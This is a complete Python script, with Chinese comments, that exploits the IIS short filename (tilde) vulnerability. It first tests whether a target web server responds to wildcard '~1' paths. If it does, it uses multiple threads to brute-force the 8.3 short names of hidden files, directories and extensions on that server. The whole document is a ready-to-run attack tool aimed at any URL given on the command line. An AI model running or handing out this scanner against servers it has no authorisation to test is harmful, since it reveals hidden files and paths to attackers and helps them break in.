# encoding=gbk
# An IIS short_name scanner   my[at]lijiejie.com  http://www.lijiejie.com
# python2 Modified by ABC_123
# python3 Modified by looks3Mz

import queue
import http.client
import string
import sys
import threading
import time
import urllib.parse


class Scanner():
    def __init__(self, target):
        # 初始化目标网址，解析URL
        self.target = target
        self.scheme, self.netloc, self.path, params, query, fragment = urllib.parse.urlparse(target)

        # 保证路径以 '/' 结尾
        if self.path[-1:] != '/':
            self.path += '/'

        # 设置扫描的有效字符集
        self.payloads = list('abcdefghijklmnopqrstuvwxyz0123456789_-')
        self.files = []  # 存储找到的文件
        self.dirs = []  # 存储找到的目录
        self.queue = queue.Queue()  # 扫描任务队列
        self.lock = threading.Lock()  # 锁，用于线程安全
        self.threads = []  # 存储线程对象

    def _conn(self):
        """建立与目标服务器的HTTP/HTTPS连接"""
        try:
            if self.scheme == 'https':
                conn = http.client.HTTPSConnection(self.netloc)
            else:
                conn = http.client.HTTPConnection(self.netloc)
            return conn
        except Exception as e:
            print('[Exception in function _conn]', e)
            return None

    def _get_status(self, path):
        """获取目标路径的HTTP响应状态码"""
        for i in range(3):
            try:
                conn = self._conn()
                conn.request('OPTIONS', path)
                status = conn.getresponse().status
                conn.close()
                return status
            except Exception as e:
                print('[Exception in function _get_status]', e)
                time.sleep(3)

    def is_vul(self):
        """检查服务器是否存在IIS短文件名漏洞"""
        try:
            status_1 = self._get_status(self.path + '/*~1****/a.aspx')  # 已存在的文件/目录
            status_2 = self._get_status(self.path + '/l1j1e*~1****/a.aspx')  # 不存在的文件/目录
            if status_1 == 404 and status_2 == 200:
                return True
            return False
        except Exception as e:
            raise Exception('[Exception in function is_val] %s' % str(e))

    def run(self):
        """开始扫描，启动线程池进行并发扫描"""
        # 从根路径开始，生成初始扫描任务
        for payload in self.payloads:
            self.queue.put((self.path + payload, '****'))  # 文件名，扩展名

        # 启动10个线程
        for i in range(10):
            t = threading.Thread(target=self._scan_worker)
            self.threads.append(t)
            t.start()

    def report(self):
        """等待所有线程完成后，输出扫描结果"""
        for t in self.threads:
            t.join()

        self._print('-' * 64)
        for d in self.dirs:
            self._print('Dir:  ' + d)
        for f in self.files:
            self._print('File: ' + f)
        self._print('-' * 64)
        self._print('%d Directories, %d Files found in total' % (len(self.dirs), len(self.files)))

    def _print(self, msg):
        """线程安全地输出信息"""
        self.lock.acquire()
        print(msg)
        self.lock.release()

    def _scan_worker(self):
        """扫描任务的工作线程"""
        while True:
            try:
                # 获取任务，扫描路径与扩展名
                url, ext = self.queue.get(timeout=6)

                # 检查路径是否返回404状态码
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    self._print('Found ' + url + ext + '\t[scan in progress]')

                    # 如果路径长度小于6，则继续生成任务
                    if len(url) - len(self.path) < 6:
                        for payload in self.payloads:
                            self.queue.put((url + payload, ext))
                    else:
                        # 扩展名枚举
                        if ext == '****':  # 扩展名初始状态
                            for payload in string.ascii_lowercase:
                                self.queue.put((url, '*' + payload + '**'))
                            self.queue.put((url, ''))  # 也可能是文件夹
                        elif ext.count('*') == 3:
                            for payload in string.ascii_lowercase:
                                self.queue.put((url, '*' + ext[1] + payload + '*'))
                        elif ext.count('*') == 2:
                            for payload in string.ascii_lowercase:
                                self.queue.put((url, '*' + ext[1] + ext[2] + payload))
                        elif ext == '':
                            self.dirs.append(url + '~1')
                            self._print('Found Dir ' + url + '~1\t[Done]')
                        elif ext.count('*') == 1:
                            self.files.append(url + '~1.' + ext[1:])
                            self._print('Found File ' + url + '~1.' + ext[1:] + '\t[Done]')
            except Exception as e:
                break


# 脚本入口
if len(sys.argv) == 1:
    print('Usage: %s target' % sys.argv[0])
    sys.exit()

# 获取目标URL并启动扫描
target = sys.argv[1]
s = Scanner(target)

# 检查是否存在漏洞
if not s.is_vul():
    print('Sorry, server is not vulnerable')
    sys.exit(0)

# 如果存在漏洞，则开始扫描
print('Server is vulnerable, please wait, scanning...')
s.run()
s.report()
